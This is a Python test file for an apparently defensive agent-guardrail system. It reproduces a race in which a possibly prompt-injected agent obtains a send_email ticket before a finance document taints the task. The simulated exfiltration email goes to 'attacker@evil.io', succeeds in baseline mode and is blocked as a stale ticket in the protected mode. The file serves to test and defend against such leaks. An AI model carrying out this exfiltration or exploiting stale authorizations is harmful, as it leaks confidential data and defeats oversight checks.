"""
test_exfil_race — canonical data-exfiltration scenario from Section 1.

Reproduces:
    1. Agent A requests permission to read a confidential finance document.
    2. Agent B (possibly prompt-injected) requests permission to send email.
    3. A naïve guardrail evaluates both against the *same* state (before
       the finance data is read) → both ALLOW.
    4. Agent A executes first, tainting the task with finance data.
    5. Agent B executes with a now-stale ticket → data leaks.

Two modes:
- **baseline**: skip_freshness_check=True (CAS disabled) → shows the
  exfiltration *succeeds* (the vulnerability exists).
- **atomicroot**: CAS enabled → shows Agent B is rejected as STALE_TICKET,
  and the email effect is never executed.
"""

import pytest

from atomicroot.store.trace_store import TraceStore
from atomicroot.authority.authority import PolicyAuthority, TaskContextStore
from atomicroot.authority.ticket import generate_keypair
from atomicroot.gateway.gateway import ToolGateway, ToolEffectLog
from atomicroot.sim.worker import SimulatedWorker


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def harness():
    """
    Set up the full system: Trace Store, Policy Authority, Gateway,
    and two simulated workers for the same task.
    """
    store = TraceStore(":memory:")
    sk, vk = generate_keypair()
    task_ctx = TaskContextStore()
    authority = PolicyAuthority(store, task_ctx, signing_key=sk)
    effect_log = ToolEffectLog()
    gateway = ToolGateway(store, vk, effect_log, allow_baseline=True)

    # Register a task that is allowed to read finance data.
    task_id = "t-9f21"
    task_ctx.register_task(task_id, {
        "data_classes_readable": ["internal", "finance"],
    })
    task_ctx.register_document("fin-report-2026", "finance")

    worker_a = SimulatedWorker("agent-A", authority, gateway)
    worker_b = SimulatedWorker("agent-B", authority, gateway)

    return {
        "store": store,
        "authority": authority,
        "task_ctx": task_ctx,
        "gateway": gateway,
        "effect_log": effect_log,
        "worker_a": worker_a,
        "worker_b": worker_b,
        "task_id": task_id,
    }


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run_exfil_scenario(harness, *, skip_freshness_check: bool):
    """
    Execute the canonical exfiltration interleaving.

    Returns (result_a, result_b, effect_log).

    Steps (deterministic ordering):
    1. Agent A requests auth for read_document (finance).
    2. Agent B requests auth for send_email.  ← Both see taint version 0.
    3. Agent A commits (bumps taint version 0 → 1).
    4. The same Commit records finance taint before the result is visible.
    5. Agent B commits with ticket that observed taint version 0.
    """
    h = harness
    task_id = h["task_id"]

    # Step 1: Agent A requests authorisation to read finance document.
    ticket_a = h["worker_a"].request_authorization(
        task_id=task_id,
        tool="read_document",
        args={"doc_id": "fin-report-2026", "data_class": "finance"},
    )
    assert "ticket_id" in ticket_a, f"Agent A auth denied unexpectedly: {ticket_a}"

    # Step 2: Agent B requests authorisation to send email.
    #         At this point, taint:t-9f21 is still at version 0 and the
    #         task has no taint → policy ALLOWS the email.
    ticket_b = h["worker_b"].request_authorization(
        task_id=task_id,
        tool="send_email",
        args={"to": "attacker@evil.io", "body_ref": "mem:blob-77"},
    )
    assert "ticket_id" in ticket_b, f"Agent B auth denied unexpectedly: {ticket_b}"

    # Step 3: Agent A commits (read_document with finance class).
    #         This bumps taint:t-9f21 from 0 → 1.
    result_a = h["worker_a"].execute(
        ticket_a,
        {"doc_id": "fin-report-2026", "data_class": "finance"},
        skip_freshness_check=skip_freshness_check,
    )
    assert result_a["status"] == "COMMITTED", f"Agent A commit failed: {result_a}"

    # Taint is recorded in the same SQLite Commit before the effect is visible.

    # Step 5: Agent B tries to commit send_email.
    #         Ticket B's footprint recorded taint:t-9f21 = 0,
    #         but the actual version is now 1.
    result_b = h["worker_b"].execute(
        ticket_b,
        {"to": "attacker@evil.io", "body_ref": "mem:blob-77"},
        skip_freshness_check=skip_freshness_check,
    )

    return result_a, result_b, h["effect_log"]


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestExfilRaceBaseline:
    """
    Baseline mode: CAS freshness check disabled.
    Demonstrates that the exfiltration SUCCEEDS — this is the vulnerability.
    """

    def test_baseline_exfil_succeeds(self, harness):
        result_a, result_b, effect_log = _run_exfil_scenario(
            harness, skip_freshness_check=True,
        )

        # BOTH commits succeed when CAS is disabled.
        assert result_a["status"] == "COMMITTED"
        assert result_b["status"] == "COMMITTED"

        # The email effect was actually executed — DATA LEAKED.
        ticket_b_id = result_b["ticket_id"]
        assert effect_log.was_executed(ticket_b_id), (
            "Baseline: the email effect should have fired (demonstrating "
            "the vulnerability)"
        )


class TestExfilRaceAtomicRoot:
    """
    AtomicRoot mode: CAS freshness check enabled.
    Demonstrates that the exfiltration is PREVENTED.
    """

    def test_atomicroot_blocks_exfil(self, harness):
        result_a, result_b, effect_log = _run_exfil_scenario(
            harness, skip_freshness_check=False,
        )

        # Agent A's commit succeeds.
        assert result_a["status"] == "COMMITTED"

        # Agent B's commit is rejected — stale ticket.
        assert result_b["status"] == "STALE_TICKET"
        assert "taint:t-9f21" in result_b["stale_keys"]

        # The email effect was NEVER executed — no data leak.
        ticket_b_id = result_b["ticket_id"]
        assert not effect_log.was_executed(ticket_b_id), (
            "AtomicRoot: the email effect must NOT fire when the ticket "
            "is stale"
        )
